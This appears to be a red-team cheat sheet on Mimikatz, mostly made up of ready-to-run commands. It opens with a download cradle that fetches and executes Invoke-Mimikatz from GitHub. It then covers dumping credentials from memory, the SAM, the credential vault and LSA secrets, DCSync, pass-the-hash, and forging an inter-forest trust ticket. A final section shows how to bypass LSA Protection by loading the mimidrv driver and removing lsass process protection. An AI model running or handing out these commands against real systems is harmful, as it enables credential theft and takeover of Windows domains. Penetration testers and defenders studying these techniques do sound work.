### Dump Credentials

```bash
# Download and execute in cradle
IEX (New-Object System.Net.Webclient).DownloadString('https://github.com/samratashok/nishang/raw/master/Gather/Invoke-Mimikatz.ps1')
 
 #Dump creds from memory
Invoke-Mimikatz -DumpCreds

# DCSync Attack
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:security.local /user:moe"'

# Dump local passwords
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"'

# Dump Credential Vault
Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'

# Dump credentials on remote systems
Invoke-Mimikatz -DumpCreds -ComputerName @("WS01","WS02")
```

### Dump Domain Credentials

```bash
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

### Spawn PowerShell (with compromised NTLM hash)

```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:DomainAdmin /domain:Security.local /ntlm:b38ff50264b7458734d82c69794a4d8 /run:powershell.exe"'
```

### Forge Inter-domain trust ticket

```powershell
# Obtain trust key between current domain and external domain
Invoke-Mimikatz -Command '"lsadump::trust /patch"'

# An inter-forest TGT can be forged
Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:Security.local /sid:S-1-5-21-1874506000-3219952063-538504511 /rc4:815720462a1b48256f16740b70356b7f /service:krbtgt /target:Vault.local /ticket:C:\AD\trust_forest_tkt.kirbi"'
```

### Over pass the hash

```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:Security.local /ntlm:<ntlmhash> /run:powershell.exe"'
```



## Protection Bypass

The below image represents an attempt to access the lsass.exe process and extract clear text passwords and run a skeleton key attack. As we can see this has not been successful since applying the registry key change mentioned in the mitigation section for LSA Protection.

![](<../../.gitbook/assets/image (1989).png>)

We can check if the LSA Protection RunAsPPL key exists by querying the registry to confirm the LSA protection is in place.

```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v "RunAsPPL"
# Value 0x1 means LSA Protection is enabled
```

This can be bypassed by utilizing the `mimidrv.sys` driver file which is included as a separate file with mimikatz.

{% hint style="info" %}
The mimidrv.sys driver file needs to exists in the same directory as mimikatz.exe.
{% endhint %}

The driver can be loaded by running the command `!+` in `Mimikatz`. After doing so the following command can be execute to protect the `mimikatz.exe` process.

```bash
!processProtect /process:mimikatz.exe
```

The same command with the `/remove` flag can be used to strip the process protection from a process such as `lsass.exe`

```bash
!processprotect /process:lsass.exe /remove
```

From here we should be free to perform actions against LSASS and dump credentials from it.

```
mimikatz.exe sekurlsa::logonpasswords
```
